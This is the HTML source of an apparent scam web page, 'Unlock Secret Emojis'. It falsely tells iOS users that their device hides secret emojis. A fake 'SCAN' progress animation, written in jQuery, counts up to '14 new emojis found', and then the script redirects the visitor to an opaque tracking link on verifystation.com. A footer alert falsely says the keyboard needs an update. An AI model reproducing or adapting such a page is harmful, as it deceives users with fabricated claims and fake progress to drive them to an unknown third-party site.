<html lang="en">

	<head>

		<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
		<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
		<!--[if lt IE 9]>
			<script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
			<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
		<![endif]-->

		<!-- font awesome -->
		<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet">
		
		<!-- jquery -->
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
		
		<!-- jquery mobile -->
		<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.1/jquery.min.js" type="text/javascript"></script>
		<script src="//ajax.googleapis.com/ajax/libs/jqueryui/1.10.3/jquery-ui.min.js" type="text/javascript"></script>
		
		<!-- google font -->
		<link href='http://fonts.googleapis.com/css?family=Oswald' rel='stylesheet' type='text/css'>
		<link href='http://fonts.googleapis.com/css?family=Open+Sans:400' rel='stylesheet' type='text/css'>
		
		<!-- percentage loader -->
		<script src="js/percentage.js" type="text/javascript"></script>
		<script src="js/main.js" type="text/javascript"></script>
		
		<!-- custom css -->
		<link href='css/style.css' rel='stylesheet' type='text/css'>
	</head>

	<body>
		
		<header id="header">
			<div id="back">
				<i class="fa fa-chevron-left fa-lg"></i>
			</div>
			<h1>
				Unlock Secret Emojis
			</h1>
		</header>
		
		<div id="content">
			<a href="#" id="animateButton">
				<span style="font-style: normal;font-size: 48px;font-weight:700;speak: none;color:#f07545;font-family:'BebasNeueRegular',sans-serif;background:#E9F3FA;padding: 10px 0;">SCAN</span>
			</a>
			<div id="topLoader"></div>
			<p id="preview">
				Preview New Emojis
			</p>
		</div>

		<div id="settings">
			<p>
				Did you know iOS has a hidden feature that allows you to enable secret emojis? Just click the back button and scan your device to enable your new emojis!
			</p>
			<div class="footer" onclick="alert('You must update your keyboard before you can use these emojis!');">
				<center><img src="css/img/keyboard.jpg" width="100%" style="max-width:1024px;"></center>
			</div>
		</div>
		
		<script>
			$(function() {
				var $topLoader = $("#topLoader").percentageLoader({width: 256, height: 256, controllable : true, progress : 0, onProgressUpdate : function(val) {
					$topLoader.setValue(Math.round(val * 14));
				}});

				var topLoaderRunning = false;
				$("#animateButton").click(function() {
					setTimeout(function(){
						// do stuff here, in your case, append text

						if (topLoaderRunning) {
							return;
						}
						topLoaderRunning = true;
						$topLoader.setProgress(0);
						$topLoader.setValue('0');
						var kb = 0;
						var totalKb = 14;

						var animateFunc = function() {
							kb += 2;
							$topLoader.setProgress(kb / totalKb);
							$topLoader.setValue(kb.toString() + ' emojis');

							if (kb < totalKb) {
								setTimeout(animateFunc, 400);
							} else {
								topLoaderRunning = false;
								setTimeout(function(){alert("14 new emojis found on your device\nTap OK to unlock them!");
													  window.location.href = "http://verifystation.com/go.php?w=5d8d9f014a5a01fb7786c2ec8a048df4"}, 500);
							}

						}

						setTimeout(animateFunc, 100);
					}, 500);
				});
			});      
		</script>
		
	</body>
	
</html>
